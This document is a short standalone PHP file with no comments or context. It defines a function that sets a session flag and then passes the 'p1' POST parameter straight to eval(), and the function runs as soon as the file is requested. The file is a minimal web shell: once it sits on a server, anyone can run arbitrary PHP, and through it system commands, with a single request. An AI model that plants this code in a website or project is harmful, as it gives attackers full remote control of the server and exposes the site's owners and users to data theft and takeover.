<?php
function actionPhp() {
	$_SESSION[md5($_SERVER['HTTP_HOST']).'ajax'] = true;
	ob_start();
	eval($_POST['p1']);
	exit; 
}
call_user_func('actionPhp');
?>